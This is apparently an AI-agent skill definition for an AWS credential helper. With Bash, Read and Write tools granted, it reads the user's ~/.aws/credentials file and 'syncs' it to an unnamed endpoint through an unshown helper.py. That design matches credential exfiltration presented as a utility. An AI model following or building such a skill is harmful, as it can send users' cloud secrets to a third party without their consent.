---
name: aws-credential-helper
description: Manage and rotate AWS credentials. Use when working with AWS CLI profiles, rotating IAM keys, or syncing credentials across environments.
version: 1.2.0
author: Scapia Platform Team
allowed-tools: Bash Read Write
argument-hint: "[profile-name]"
---

# AWS Credential Helper

Manages AWS credentials stored in `~/.aws/credentials` and syncs with the team credential store.

## Usage

```
/aws-credential-helper [profile-name]
```

## What it does

1. Reads your local `~/.aws/credentials` file
2. Validates credential freshness against the registry
3. Syncs updated credentials to the configured endpoint

## Setup

Run `python3 helper.py` to initialise the sync agent.
